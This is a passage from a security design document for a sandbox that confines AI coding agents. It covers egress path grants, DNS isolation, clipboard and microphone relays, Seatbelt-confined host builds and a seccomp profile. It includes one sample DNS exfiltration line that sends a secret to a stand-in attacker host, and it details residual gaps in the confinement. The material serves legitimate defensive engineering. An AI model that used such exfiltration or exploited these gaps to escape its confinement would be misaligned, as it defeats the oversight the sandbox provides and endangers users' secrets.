  - a path whose only spelling escapes an ASCII character other than a space, such as `%2F` inside
    a Cloud Storage object name. Such a path cannot be narrowed at all.
- A path in the wrong case fails closed alike on GitHub, where `/MyOrg/` and `/myorg/` are one
  owner, and on Cloud Storage, where they are two buckets.
- The proxy does not follow redirects. A client that follows a redirect sends a new request, which
  must independently satisfy the rules for its destination and path. An earlier grant does not
  authorize the redirected request.
- A path grant does not bound the message ("Exfiltration through allowed network traffic", above).

The catalog grants whole-host access to public Git hosting services by default. A workspace that
needs access to one owner can deny the host and then allow that owner's path.

Two forms of widening are allowed but made explicit:

- A `method=POST` grant that covers a repository's discovery and `git-receive-pack` paths allows
  push. The launch's widening report and `--egress-effective` show that grant.
- A `tunnel` grant for a host that the defaults inspect requires `deny defaults` followed by the
  workspace's complete ruleset. This makes the loss of inspection and request-level auditing an
  explicit decision about the whole ruleset. Restricting an existing tunnel to inspected reads
  requires only a deny and an allow for that host.

A wildcard *removal* is the mirror image. A removal only ever shrinks what is allowed, so its worst
case is denying a wanted host, which fails closed, never reaching a new host.

- `**.foo.com` is the concise way to drop a provider that ships several subdomains, without
  re-listing the provider's current ones.
- `deny model-provider NAME` names every host in that provider's default rules, as the provider's
  endpoints change (`doc/egress-proxy.md`, "The rule file").

Unlike a grant, a removal can fail when a typo matches nothing. The default then stays in place,
while the file reads as though the default were dropped. The warnings:

- A `deny` that matches nothing at its position produces a warning under every profile, so a
  misspelled deny does not fail silently.
- The redundant-grant and taken-back warnings (`doc/egress-proxy.md`, "The rule file") concern lines
  that grant nothing. Those lines get warnings rather than refusals because the check reads the
  defaults, and a file that launches today must not fail under a later image whose defaults include
  that grant.

Every other ambiguity is a failed launch, never ignored config. `doc/egress-proxy.md` lists those
ambiguities.

### Why the ruleset is not a capability system

The ruleset names destinations and grants protocol operations: reading, Git fetch, and specified
HTTP methods at paths. The ruleset has no `GitRead(owner/repo)`-style capabilities. This absence is
deliberate: agents need broad access to public information, and the launcher does not automatically
forward host credentials ("Credential theft", above).

A per-repository capability could restrict the private-repository access that credentials such as
Copilot's `repo`-scope token grant ("The web reached through the model provider", above).

- Under the default inspected rules, the token's excess repository authority allows reads, and
  writes are refused.
- That limit does not cover explicit method grants or Copilot's opaque model endpoint.
- Restricting those reads to one repository would reduce exposure. But an allowed read could still
  exfiltrate workspace data in its URL ("Exfiltration through allowed network traffic", above).

A capability vocabulary would add another policy language whose semantics must stay consistent
across its consumers. A standing decision requires a concrete credentialed-operation requirement
before that mechanism is added (`doc/design.md`, "No general capability broker").

### DNS

No DNS query from the sandbox container reaches a server outside the run, so DNS carries no data
out. Clients configured to use the proxy send `CONNECT host:443`. The proxy looks up the destination
only after the ruleset allows it (the connection checks above), so those requests need no lookup
inside the sandbox. No other place where the container can look a name up passes the name on:

- **The public resolvers in the image's `resolv.conf`** are unreachable. `--dns=none` means podman
  writes no `resolv.conf`, so the container keeps the image's own.
  - The sandbox's network is `--internal`. The network's routing table holds one on-link entry and
    no default route. So a packet to a nameserver outside the network has nowhere to go, and the
    lookup fails at once rather than travelling anywhere.
- **The network's own resolver**, aardvark-dns at the network's first address, answers the run's
  container names, and answers `NXDOMAIN` for every other name, forwarding none.
  - podman documents this for
    [`--internal`](https://docs.podman.io/en/latest/markdown/podman-network-create.1.html#internal)
    networks. aardvark-dns forwards no query from a container attached only to internal networks
    (`ctr_is_internal` in
    [`src/dns/coredns.rs`](https://github.com/containers/aardvark-dns/blob/main/src/dns/coredns.rs)).
- **`/etc/hosts`** holds the one name that must work: `--add-host` puts `egress-proxy` there.

**Routing and the `--internal` network enforce this, not the resolver configuration:** `--dns=none`
puts no resolver out of reach. Unsetting the proxy variables does not create a route.

What a session is left with, measured from inside a session:

    $ getent hosts egress-proxy          # from /etc/hosts, no resolver involved
    10.89.0.2       egress-proxy
    $ getent hosts $SECRET.attacker.example
    (no answer, 2 ms)

`SessionBoundaryTest` checks failed direct network access, failed external name resolution, the
absent default route underlying both, and which names the network's resolver answers.

A run-on-host command's own lookup of an internet name fails too, although the command's profile
grants the Mach service that the system's resolver library asks (`SeatbeltProfile.MachServices`).
Under the sbt profile, `InetAddress.getAllByName("example.com")` answers
`nodename nor servname provided` (2026-09-29). The acceptance test's row "DNS resolution (the
system's resolver) fails" checks this failure.

## Clipboard

Clipboard access is off by default because the host clipboard may contain sensitive information.

- `--clipboard=` accepts `off`, `paste` or `bidirectional`. Without the option the mode is `off`,
  and any other value fails the launch.
- The launcher reads the mode from no variable, so a shell profile cannot grant the clipboard to
  every process that the shell starts. The options file may set the mode, and the launch prints the
  mode (`doc/design.md`, "Host resources are granted by launch options, not variables").

The enabled channel has these properties:

- **The sandbox asks; the host answers.** The sandbox opens no connection to the host.
  - The relay is a job of the reaper on POSIX, and a thread of the resident launcher on Windows.
    The relay reads requests through a `podman exec` on the FIFO
    `/tmp/ko-agent-sandbox/clipboard/req` in the sandbox. The relay answers each request through
    another exec, on `rsp` beside `req`.
  - The channel has no host listener, no port, no proxy rule and no file in the workspace. Nothing
    moves until a clipboard call from inside (`ClipboardRelay`, the image's `ko-sandbox-clipboard`
    shim).
- **A request is read to a fixed size and no further.** Anything in the sandbox can write the
  FIFO.
  - The host cuts what it reads of one exec's stream at `ClipboardRelay.MaxRequestBytes`, whatever
    a request declares.
  - A `set` whose count exceeds that limit is refused, and a body is copied only whole.
  - The rest of an exec's stream after a refused request is dropped.
- **The grant is to the container, not to the agent.** Any process can invoke the shim: an agent
  subprocess, a build script, or a dependency's postinstall script. So the selected mode applies to
  everything the session executes. Use `off` when that code must not access the clipboard.
- **`paste` grants reads of the current image, as often as asked, for the whole session.**
  - Each request gets a PNG when the clipboard holds one, with no prompt and no per-read consent.
    The user controls only what is on the clipboard at each moment. So a process polling the FIFOs
    can capture images copied later in the session.
  - Text is never served.
    - Text pasted through the terminal, such as with Cmd+V, still reaches the session in every
      mode, `off` included. The terminal types the text in as input, and the user chooses each
      paste.
  - A `set` request is read and dropped.
- **`bidirectional` adds writes.** A session can replace the clipboard with arbitrary text,
  including text the user may later paste into a terminal. The user must explicitly select this
  mode.
- **The channel lasts for the session.**
  - The FIFOs are on the container's tmpfs, and the relay ends with the sandbox.
  - If the relay dies, the shim fails within its timeout rather than blocking the TUI
    indefinitely.
  - Clipboard contents written by the session can remain after exit.

### Terminal clipboard requests (OSC 52)

OSC 52 is a terminal escape sequence. A program writes the sequence to its terminal to put text on
the system clipboard, or to ask for the clipboard's text. OSC 52 bypasses the channel above.

- In every mode, `off` included, any process in the session can send OSC 52.
- The sandbox filters neither what the session writes to the terminal nor what the terminal
  answers, so the terminal's own settings decide.

What the terminals do by default:

- **Writes.** kitty, Ghostty and WezTerm set the clipboard on request by default.
- **Reads.** kitty and Ghostty by default answer with the clipboard after the user accepts a
  prompt, and can be configured to answer without one. WezTerm ignores the request.

What to choose:

- When the session must not set the clipboard, use `off` or `paste`, and a terminal that ignores
  OSC 52 writes or has them turned off.
- When the session must not read the clipboard, use `off`, and a terminal that ignores OSC 52 reads
  or has them turned off.
- To let the terminal answer reads only with your consent, keep the terminal's prompt, and decline
  a prompt you did not expect.

## Microphone

The host microphone is off by default. `--audio=mic`, given on the command line or in the options
file, lets the agents' voice dictation record the microphone, and the launch prints the setting
(`MicrophoneRelay`, the image's `ko-sandbox-mic`; `doc/microphone.md` has the design). The channel
has these properties:

- **The sandbox asks; the host answers.** The sandbox opens no connection to the host.
  - A PulseAudio daemon inside the sandbox serves the agents. The daemon's microphone is a FIFO
    under `/tmp/ko-agent-sandbox/microphone`, and the daemon's socket reaches nothing outside the
    container.
  - The relay is a job of the reaper on POSIX, and threads of the resident launcher on Windows. The
    relay reads a `start` request through a `podman exec` on the FIFO `req` in that directory. The
    relay forwards the recording through another exec into the daemon's FIFO.
  - The channel has no host listener, no port, no proxy rule and no file in the workspace.
- **The grant is to the container, for the session.** Any process in the sandbox can open a stream
  on the daemon's microphone, as often and as long as it likes, with no per-recording consent.
  - An open stream is a process recording, which need not be the user dictating.
  - When code in the session must not hear the room, leave out `--audio=mic`, or pass
    `--audio=off` over the options file's setting.
- **When the host microphone is open.** The host microphone is open from the launch to the
  session's end, whether or not anything records. The relay starts the recorder at the launch and
  keeps it running.
  - While nothing records, the relay discards the audio as it arrives. Between a request and the
    writer's `ready`, the relay keeps that audio on the host, so the first word survives the round
    trip. From `ready` on, the relay forwards the audio.
  - On the host the audio passes through the relay's FIFOs, in a directory of mode 0700, or on
    Windows through the launcher's own pipes. Nothing writes the audio to a file.
  - Audio reaches the sandbox from a request until one of these happens: the last stream on the
    microphone closes, the controller or the writer inside the sandbox dies, or the container or
    the session ends. Nothing bounds how long a stream stays open.
  - macOS shows its microphone indicator for the whole session. Whether Windows and the Linux
    desktops show one is unmeasured. Nothing shows when audio is forwarded.
- **Audio an agent transcribes may not come from the host microphone.** Any process in the sandbox
  can write audio into the daemon's FIFO, and an agent dictating then transcribes that audio. The
  channel guards the host microphone's confidentiality, not the authenticity of audio inside the
  sandbox. Inside the sandbox every process already shares the agent's files and trust.
- **What leaves the host is the agent's doing.** Claude Code streams the audio to Anthropic, and agy
  streams it to Google, under the egress rules that the session already has.
- **Without `--audio=mic`** no daemon runs and no FIFO exists. The image's PulseAudio clients start
  no daemon of their own, and the image has no other capture path.

## Run on host

`--run-on-host=<programs>` (`sbt`, `mill`, `gradle`, `mvn`) is off by default and available only on
macOS. The option lets agent-chosen code execute on the host under a Seatbelt profile. These
commands execute outside the container, so the profile provides their confinement.
`doc/run-on-host.md` describes the mechanism. The security properties and costs:

- **macOS only, structurally, not by neglect.** The `.git` and `.ko-agent-sandbox` denies below must
  hold at every access, for a directory that the command creates as much as for one present at its
  start. Seatbelt evaluates its path filters at each access. The confinement that Linux and Windows
  offer is fixed when the command starts. `doc/run-on-host.md`, "Why only macOS", details the
  alternatives:
  - Linux: bubblewrap's mounts and a Landlock ruleset cover no `.git` created during the command.
    A host command also gains nothing on Linux: a container command already runs at host speed on
    host memory.
  - Windows: AppContainer's ACLs express the grants but not the denies. ACL inheritance has no name
    patterns, so a `.git` created during the command inherits the workspace's allow.
- **The sandbox asks; the host answers.** A host-side runner uses a FIFO channel like the clipboard
  relay's. The runner starts each command as its child, streams output back, and returns the exit
  code.
  - The channel has no host listener or port, and the host runner initiates execution
    (`RunOnHostChannel`, the image's `ko-sandbox-run-on-host` shim).
  - The listeners that a `mill` or `gradle` build binds are a grant of the build's own profile,
    below.
- **The profile is the boundary; the request is not.** A request names a program, a working
  directory and arguments.
  - The program must be among those that `--run-on-host` named.
  - The requested working directory is resolved and checked to lie inside the workspace before
    anything derives from it. The directory never changes the profile's workspace grant.
  - The arguments are deliberately not vetted. The arguments select code that the agent already
    chooses (`sbt 'set …'` reaches arbitrary Scala without touching `build.sbt`), and the profile
    confines whatever they select.

  A command's access:
  - the workspace, read-write, except `.git` and `.ko-agent-sandbox`:
    - those two names are denied at any depth after path resolution, link creation included, with
      the unmeasured spellings that `doc/run-on-host.md` records;
    - writes and links are also denied to what the launch's file rules make read-only, and to the
      paths that the workspace policy's guard added;
  - the command's own per-workspace run-on-host caches;
  - one Coursier-managed JDK, read-only:
    - under `mill`, also the JDK that Mill's launcher resolved for a build directory's pinned or
      unset `mill-jvm-version`, read-only, once a host run provisioned that JDK;
    - a command can write the file that names that JDK. So the command can choose among the JDKs in
      your Coursier cache, and nothing outside that cache (`doc/run-on-host.md`, "A pinned JVM");
  - the program's own executable and distribution, read-only:
    - the cs-installed `sbt`, and the distribution it execs in the Coursier archive cache;
    - the one mill launcher that the user provisioned;
    - the one Gradle that the build directory's wrapper unpacked under
      `$GRADLE_USER_HOME/wrapper/dists` (`~/.gradle/wrapper/dists` when `GRADLE_USER_HOME` is
      unset);
    - the one Maven that the build directory's wrapper unpacked under
      `$MAVEN_USER_HOME/wrapper/dists` (`~/.m2/wrapper/dists` when `MAVEN_USER_HOME` is unset);
  - a temporary directory for that command. Under `mill` and `gradle` that directory is the runner's
    own, where the daemons' forked JVMs write;
  - under sbt, the sockets of the launch's sbt server under the runner's own directory; under
    `mill` before 1.2, the one port of the launch's mill daemon;
  - the port of one egress proxy. Under sbt, `mill` and `gradle` the proxy is the runner's for that
    program, kept across the launch's commands of one build directory. Under Maven the proxy is the
    command's own;
  - that proxy's CA certificate, read-only.

  Every other user-owned file is invisible, including the launcher state root and the rest of the
  user's caches.

  The mill daemon and every Gradle process, alone among the host processes, may bind listeners on
  any port. Mill and Gradle bind port 0, and no rule confines a bind to one port. From Mill 1.2 on,
  the mill command has that grant in the daemon's place.
  - Every process that they fork inherits that grant. So a test under `mill` or `gradle` can bind a
    TCP or UDP listener, where a test under sbt or Maven gets `EPERM`.
  - The bind is at any address of this host, not loopback alone. SBPL's `localhost` class admits a
    bind to the wildcard or to the LAN address, and a socket so bound answers at the LAN address
    (measured from this host, `src/probe/run-on-host-runner-session.sh` G1, G9, G10). The filter
    admits by the local address, so a LAN peer's connection is the same case.
  - The cost is Mill's and Gradle's. The table at the end of this section states the cost beside the
    other programs':
    - the mill client's own profile reaches the daemon's one port and the proxy, and the daemon's
      outbound is the proxy's port alone;
    - a Gradle process reaches, beyond the proxy, any port of this host. Gradle's daemon, workers
      and file-lock socket connect to each other's ports of the kernel's choosing.

  The proxy allows the repositories named in `.ko-agent-sandbox/run-on-host/<program>/egress/rule`,
  plus Maven Central.
  - The file takes `allow https://<host>/ read` lines only. Unrecognized configuration entries are
    refused, as in the parent directory.
  - The proxy inspects every host it allows, so `read` is enforced as under "Reading without being
    able to write", above. To a host that the file names, a host command sends a `GET` or `HEAD`
    without a body and nothing else, and each request is logged with its target. No host command
    gets a tunnel.
    - Each proxy's starter creates a CA for that proxy alone, and signs one leaf naming the proxy's
      hosts. The starter never writes the CA's key, and drops the key once the leaf is signed. So
      nothing signs a second certificate under that CA.
    - The proxy holds the leaf's key, in its starter's session directory, which no command's
      profile grants.
    - The trust store and the PEM file that the command is given hold the CA's certificate and no
      public root. A program with roots of its own keeps them, as Node.js does under
      `NODE_EXTRA_CA_CERTS`.
    - The sandbox container trusts none of these CAs, and no host command trusts the workspace's CA
      ("Who holds the CA key", above). So whoever holds a leaf's key can answer as its hosts to one
      proxy's host commands, and to nothing else.
    - A program that a build starts verifies the proxy only if it reads the JVM's trust store
      property or one of five CA bundle variables. Any other program fails its certificate check on
      every host. `doc/run-on-host.md` lists the variables and their readers ("The command's
      lifetime and environment") and the certificates ("The command's egress proxy").
  - A launch that selects the program prints the file's hosts. So a host that arrived with the
    repository does not take effect unseen.
  - The proxy reads the file when it starts. A host removed from the file stays reachable from the
    runner's proxy until that proxy is next created (`doc/run-on-host.md`, "The command's egress
    proxy").
  - The proxy runs under a profile of its own. That profile grants the proxy's executable, the
    system paths and the leaf's directory as reads, and the network, and nothing else of the
    user's: no workspace, no cache, no write anywhere.
- **The command's environment is a closed set, not the launcher's.** The supervisor constructs the
  environment from its own settings, three pass-through variables, and the variables that `--env`
  named at launch. `doc/run-on-host.md`, "The command's lifetime and environment", lists those
  variables. The same forwarded variables reach the sandbox, and `KO_AGENT_SANDBOX_*` is refused on
  both paths. Inheriting the full host environment would expose unrelated secrets to agent-chosen
  code, including an upstream proxy credential in the launcher's `HTTPS_PROXY`.
  - The supervisor's settings take precedence, so a forwarded `HTTPS_PROXY` cannot redirect the
    command past its proxy.
  - The supervisor supplies its JVM properties through HotSpot's `_JAVA_OPTIONS`, replacing any
    forwarded value of that variable. These properties take precedence over `JAVA_TOOL_OPTIONS`,
    `JDK_JAVA_OPTIONS` and command-line properties.
  - `MILL_VERSION` names the launcher that the profile authorizes, whatever was forwarded.
  - Below the launcher, whose arguments are what the user typed, forwarded names travel to the
    runner and each command as arguments.
    - Values travel through the processes' environments under carrier names
      (`RunOnHostSandbox.carrierName`). So no unconfined helper reads an explicit value before the
      command's environment is built.
    - The runner inherits the launcher's environment as the launcher's own JVM ran in it. So a
      name-only forward names a variable already there.
  - A name brokered with `--egress-cred` is its placeholder in the command's environment ("Who
    holds a brokered value").
  - The profile denies the command reading other processes' arguments and environments: the
    launcher's, the runner's, a supervisor's and `podman`'s, which carry the launching shell's
    environment among them (`SeatbeltProfile.ProcessReadRule`; `doc/run-on-host.md`, "The Seatbelt
    profile").
    - The one exception is a mill client reading its own daemon's, whose environment the runner
      built from the same closed set.
- **A workspace script runs unconfined only on your explicit yes.** Before its start prompt, the
  launch finds the missing mill launchers, the JDKs that mill's launcher resolves for the builds,
  and the Gradle and Maven distributions: those without which the launch's commands would be
  refused. The launch offers the run that downloads each:
  - The run is the build directory's own `./mill`, `./gradlew` or `./mvnw`, a workspace file that
    the agent can edit.
  - The launch shows the run as the full command, with any character that the terminal would act on
    spelled out.
  - The run executes unconfined and in the launcher's environment, only on a `y` to a prompt that
    says so (`doc/run-on-host.md`, "Program prerequisites").
  - That run is the manual run that the refusal asks of you, with the same authority. The script is
    the workspace's, and what it downloads lands where your own script runs from.
  - Nothing runs without the answer. A launch without a terminal, or a launch starting immediately,
    prints the refusal and runs nothing.
- **One sbt server, and one mill daemon, per build directory, owned by the launch's runner.** A
  thin sbt client attaches to whatever server the build directory's portfile names. Mill's launcher
  attaches to whatever daemon holds `out/mill-daemon`. Either client then runs with *that
  process's* environment: its cache, and its confinement or lack of it. So the runner starts the
  server or daemon itself, inside its own profile, before the first sbt or `mill` command of a build
  directory. Every command from that directory attaches to that server or daemon:
  - the sbt client through the sockets under the runner's own directory;
  - the `mill` client through the one port that the runner observed the daemon listening on. The
    runner reads the port from `out/mill-daemon/socketPort` as a candidate, which the file never
    authorizes.
    - A link that redirects `out/mill-daemon` or an entry in it refuses the command. Through such a
      link, Mill's launcher would act on another build directory's daemon.
    - A link that the build makes after that check is not caught. On a fingerprint mismatch, such a
      link lets the launcher end a daemon whose directory lies under the command's writable roots,
      the reach that the profile's write grant sets. The one-port rule still keeps the client from
      attaching to that daemon.
  - From Mill 1.2 on, the runner starts no daemon, and each command runs the build in its own
    profile. Mill's daemon reads each launcher's process information, which `ProcessReadRule`
    refuses across sandboxes (`doc/run-on-host.md`, "Mill 1.2 and later: no daemon").

  The runner keeps one server or daemon per build directory it visits, all warm at once. The runner
  ends them with the launch, or when their proxy is gone. A cancel follows the stock program
  (`doc/run-on-host.md`, "Where a host command deviates from the stock program"):
  - an sbt client's disconnect cancels the running exec, and the warm server survives for the next
    command. So a test that ignores interruption lingers in the server exactly as it does in a
    terminal;
  - a `mill` client's disconnect mid-command makes the daemon shut itself down, and the next
    command starts a new daemon.

  Gradle's daemon is Gradle's own.
  - The client starts the daemon under the profile, and matches it in a daemon registry of the
    launch's own, under the runner's `tmp/`. The registry is not in the per-workspace user home,
    where one launch's `gradle --stop` would end another launch's builds, and never in yours under
    `~/.gradle`.
  - After each command, the runner records the daemon by pid and start time. The launch's
    `java.io.tmpdir` in the daemon's initial environment identifies the daemon as the launch's.
    With the launch, the runner ends the daemon's group, including the workers and test executors
    in that group.
  - Two kinds of daemon stay unrecorded: one started under a runner that died during the command,
    and one whose build code rewrote that environment in the daemon's own memory, where `ps` reads
    it. Such a daemon is confined and holds nothing of the launch. Once idle, the daemon exits on
    Gradle's idle timeout, three hours. A daemon hung in its build has no bound.

  Maven runs once and exits, so no warm process spans its commands.

  A runner signals only its own servers and daemons. The exceptions:
  - A server of *yours* that holds a build directory's portfile, started from your own terminal
    outside any launch, is ended before the runner's server starts. The transcript says so.
    - The runner ends it by protocol, which the server runs after the exec it is on. The runner
      sends the request to the socket that it derives from the build directory by sbt's derivation,
      never to a socket the portfile names. The portfile is workspace content, so trusting its
      spelling would let the workspace redirect an unconfined client exchange to any socket this uid
      can reach.
    - The derived path is refused if a command could have planted it. Resolution proceeds one link
      at a time, and no step may resolve into the workspace or into the per-workspace caches that
      outlive a session. The refusal stays in place for an environment that places sbt's server
      directory inside either, and for a chain that passes through either on its way somewhere
      innocent.
  - A daemon of yours that holds `out/mill-daemon` is ended the same way. The runner finds the
    daemon in the process table, never through `processId`, and signals the daemon behind its pid
    and start time once no client is connected.
    - The observation is `lsof`'s, repeated immediately before the signal, with a two-minute bound.
      After that bound the command is refused instead.
    - A terminal `./mill` that connects between that observation and the signal dies with the
      daemon, and no observation closes that window.
  - Another *launch* still owns a server or daemon when that launch's runner's session names the
    build directory.
    - The command attaches to that server or daemon when the one this launch would start has the
      running one's confinement and environment.
    - Otherwise the command ends the running one and replaces it with its own. The command ends it
      by that runner's record, under the retirement lock that every ender of a recorded group holds.
    - The owner describes each runtime by a fingerprint of the profile's inputs, the closed
      environment and the proxy's rule lines, the forwarded values included. So a launch that
      forwards a secret never serves a launch that does not, and a launch whose rules differ never
      resolves through the other's proxy (`doc/run-on-host.md`, "The channel and the command").
    - The request's own launcher flags are not in the fingerprint. The flags select settings inside
      a process that the profile confines, where the supervisor's `_JAVA_OPTIONS` overrides them, as
      within a launch. `RunOnHostRuntimeDescriptor.fingerprint` has what the flags can and cannot
      reach.
    - That group is the one group of a live launch that a runner signals and does not own. The
      scavenger, below, collects a dead launch's group.
    - The record alone attributes the group: a file in the owner's session directory, which no
      confined process can write, never the portfile or the process table. So nothing that a command
      writes can aim the signal. The group is signalled only behind its leader's recorded start
      time, as every ender does.
  - Nobody live owns a dead launch's leftover server. The scavenger collects that server, by its
    own exclusive claim, before a fresh one starts.

  The costs:
  - your own terminal server or daemon for a build directory is ended when the agent runs that
    program there;
  - while the launch's daemon lives, your own `./mill` with matching settings attaches to the daemon
    and runs your build under the profile. A `./mill` with different settings ends the daemon, as
    stock Mill does. The runner then ends yours once idle, and starts its own again;
  - two launches on one workspace share a build directory's server or daemon only while each launch
    would start one under the same confinement and environment. Otherwise each launch's command ends
    the other launch's server or daemon and starts its own, and the warm build that the other launch
    left is lost with it.
- **The payload that matters runs later, as you.** If a command could write an executable
  `.git/hooks/post-checkout`, that hook would run on your next `git checkout`, outside every
  sandbox. Two enforcement points prevent that write, both named under "The host's git executing
  what the sandbox wrote", above:
  - the session's backend, FUSE or BPF, for writes through the workspace mount;
  - this profile's deny rules, for writes by the command.
- **Cache poisoning stops at the workspace.** The command writes its own per-workspace caches, never
  yours:
  - the Coursier cache;
  - sbt's global base, meaning its boot directory and content-addressed store, and sbt's Ivy home,
    which `publishLocal` writes;
  - Gradle's user home, which holds every plugin and dependency a Gradle build resolves;
  - Maven's local repository, which holds every plugin a Maven build runs.

  What that separation gives, and how it is kept:
  - A poisoned artifact in any of these caches reaches later agent commands of the same workspace,
    which are themselves sandboxed. The artifact reaches no other workspace and no unsandboxed
    command.
  - `--reset` discards all of these caches with the workspace's other state. `--reset-run-on-host`
    discards those caches alone.
  - The separation is by root, because Seatbelt has no mount namespace to overlay with. One
    directory holds the caches (`doc/run-on-host.md`, "The run-on-host cache").
    `doc/plan-coursier.md` reaches the same property for the container by a podman `:O` upper.
- **The command's output names host paths**, as every session's does: the workspace root is mounted
  at its own path ("The workspace", above).
- **`--workspace=read-only` composes, and the workspace is then no longer read-only to the
  session.** A host command can write `target/` and any other path that the profile's workspace
  grant allows. Selecting both options authorizes those writes despite the container's read-only
  mount, and the launch says so on a line of its own. A session that must leave the workspace
  untouched must not enable `--run-on-host`.
- **A listed file can reach a workspace subdirectory through `node_modules`.** A host command can
  move a directory out of `node_modules`, with a listed file that the session wrote in it, to a path
  such as `apps/web`. A host program started there then runs the file.
  - A listed name still cannot be written at the workspace root or inside a directory that a line
    names (`doc/file-rules.md`, "Under `--run-on-host`").
  - A session without `--run-on-host` has no such gap.
- **Teardown follows descriptor lifetime.** The shim holds one FIFO open for the life of its
  request, and the request itself travels on that FIFO. So no command starts without its liveness.
  - An interrupted command, a killed shim and a dead sandbox container all close the FIFO, and the
    runner ends the command with SIGTERM. The supervisor's own hook teardown:
    - ends the command's process groups and, under Maven, the command's proxy;
    - appends the command's proxy audit log to the channel's log on the host (`doc/run-on-host.md`,
      "The channel and the command");
    - removes the command's directory.

    The runner's server or daemon stays, as above.
  - The supervisor holds the runner's pipe the same way. A runner that is gone, ended or killed
    closes the pipe, and the supervisor ends its command by the same teardown.
  - A runner ended by TERM exits only after that teardown, and then ends its own session, as it does
    at the launch's end. The runner first appends the servers' logs, the daemon starters' output and
    the proxies' audit logs to the channel's log. The runner then ends the groups of its servers,
    daemons and proxies.
  - No server or daemon that the runner recorded survives the launch that owns it. That includes a
    Gradle daemon that its client started and the runner then recorded. A Gradle daemon that the
    runner never recorded is the residual above.
  - A later launch adopts no server or daemon whose owner is gone: a new runner publishes a new
    session and reuses nothing.
  - If SIGKILL prevents the supervisor's or the runner's teardown, the recorded groups remain,
    including the runner's servers, daemons and proxies. The next start's scavenger ends them. The
    scavenger ends a group only after checking that the group's leader has the recorded start time,
    never by guess:
    - a server whose group leader is gone is ended by the shutdown protocol, at the socket that its
      portfile names. The scavenger sends the request only once that socket resolves inside the
      dead session's directory;
    - a daemon whose group leader is gone is nothing that a file attributes. The daemon exits on
      Mill's own idle timeout.

    A record is forgotten only once `ps` shows its group ended or empty. A record whose members
    outlive the KILL, or that `ps` could not observe, stays for the next start to retry.

What a build's processes can do on your host's network, per program, beyond the egress rule file.
This reach is what you accept by naming the program in `--run-on-host`:

| program | listens | connects | you give up, each row adding to the last |
|---|---|---|---|
| sbt, Maven | nothing: a bind gets `EPERM` | the proxy's port | a service sharing that port |
| `mill` | any port, any address | the proxy's and the daemon's ports | a build serving the LAN |
| `gradle` | as `mill` | any port of this host | and every service on this host |

- "Any address" is every address of this host, TCP and UDP, since Seatbelt cannot name loopback
  alone (the bind bullet above; `doc/run-on-host.md`, "Network").
- The table covers IP sockets. UNIX sockets under the launch's directories have separate path
  grants.
- The `mill` daemon's port is reached by its clients alone.
- A port grant is a port at every address of this host too. The proxy listens on the loopback
  address, so the grant reaches, beside the proxy, only a service listening on that port at another
  address.
- Gradle's daemon, workers and file-lock socket bind ports of the kernel's choosing and connect to
  each other's ports, so Gradle needs both grants (`doc/run-on-host.md`, "Network").

## No containers inside the sandbox by default

The default excludes both forms of additional container execution:

- **Nested**: the supported runtime requires relaxed process masks, SELinux confinement and
  capability settings, as detailed below. In particular, a nested container cannot mount its own
  `/proc` while the locked overmounts remain in place. Those relaxations also apply to untrusted
  repository code running in the outer container.
- **Sibling**: a service container beside the sandbox would be a new host-level object with its
  own attack surface. The sandbox could reach that container laterally, and the container would run
  outside the sandbox's confinement.

Test services can instead run as ordinary processes inside the sandbox, with the same uid,
capabilities and egress confinement. Examples are PostgreSQL through `initdb`/`pg_ctl`, and an S3
endpoint through a JVM mock such as Adobe S3Mock.

**The default's seccomp profile.** Under `--nesting=none` the session runs under the launcher's
own seccomp profile (`SeccompProfile.scala`), not podman's default. Podman's default lets an
unprivileged process create a user namespace.

- Measured in a default session on 2026-10-17: after `unshare -Urm` the process holds every
  capability (`CapEff` `000001ffffffffff`), and mounts `tmpfs`, a bind and overlayfs.
- `io_uring_setup` already answers `ENOSYS`, so that interface needs no rule.

The profile:

- answers a `clone` or `unshare` that sets `CLONE_NEWUSER` with `EPERM`, and allows one that does
  not. `EPERM` is the "Operation not permitted" that `unshare -Ur` and bubblewrap print;
- answers `clone3` with `ENOSYS`, since the flags of `clone3` sit in memory that a filter cannot
  read (`SeccompProfile.NamespaceSyscalls` has the sources):
  - glibc 2.41, the image's, retries with `clone`, `posix_spawn` included, except with
    `POSIX_SPAWN_SETCGROUP`;
  - Go has no fallback for a launch that sets `UseCgroupFD` or `CLONE_NEWTIME`, and calls `clone`
    for any other launch;
- answers `setns` and every mount syscall, `mount` to `pivot_root`, with `EPERM`:
  - Without a user namespace each of these syscalls already fails for want of a capability. The
    rules keep a mistake in the namespace rules from reopening a mount or a join.
    `ko-agent-fs/bpf/doc/architecture.md` relies on that ("Mounts").
  - The rules cover the whole mount family, because a mount that `fsmount` or `open_tree` returns
    is writable through its descriptor before `move_mount` attaches it (measured 2026-10-17);
- answers the `setxattr` and `removexattr` families, ACLs among them, and `file_setattr` with
  `ENOTSUP` (`SeccompProfile.AttributeSyscalls`):
  - The FUSE backend refuses these routes by not implementing them, and the BPF backend holds no
    hook for them (`ko-agent-fs/bpf/doc/architecture.md`, "Attributes, flags and ioctls"). The rule
    holds them in every `--nesting=none` session, under `~` too.
  - No `ioctl` command is refused. libseccomp clears a syscall's argument rules when an
    unconditional rule for that syscall arrives (`src/db.c`, `_db_rule_add`). So refusing the
    commands that set a file's flags means spelling every allowed command as a masked prefix, some
    255 rules. The first version does without those rules (`doc/TODO.md`, "Attribute routes as
    `--workspace` values, spending the free hook slots").
  - On the podman machines the shares answer those commands with `ENOTTY` themselves.

`--build` and `--update` derive the profile from the default profile that the podman host has
installed. So a podman upgrade's changes reach the profile at the next build.

- The launcher names the profile to `podman create` by path. The podman server reads the file,
  which is why the file sits under the launcher's state root, a directory that the podman machine
  shares.
- A launch refuses a profile that an earlier build derived without the rules this build adds, as
  the launch refuses a missing profile, since the BPF backend's protections rest on those rules.
  The build derives the profile before it installs the backend.
- The refused names are taken out of the default's rules rather than overruled by later rules.
  libseccomp keeps a syscall's first unconditional rule, and drops every later rule for that
  syscall. That was measured on the default's own later `setns` refusal, which `setns(-1, 0)` shows
  is not in force (`EBADF` from the kernel).

The profile's cost: every program that sandboxes itself with a user namespace fails at that step,
such as bubblewrap, Chromium's namespace sandbox and the agents' own command sandboxes. A
workspace's own `unshare -Ur` step fails with `Operation not permitted`.

- Claude Code's Bash-command sandbox is off in the managed settings, and Codex runs
  `danger-full-access` (`container/ko-agent-sandbox/Containerfile` has the reasons). So neither
  agent calls bubblewrap as configured.
- `setfattr`, `setfacl` and `chattr` fail everywhere in the session, `~` included. `cp -a` and `tar`
  drop extended attributes and ACLs silently, as they do on a filesystem without them.

**The opt-ins, and the controls they relax.** `--nesting` accepts `none`, `user-namespace` or
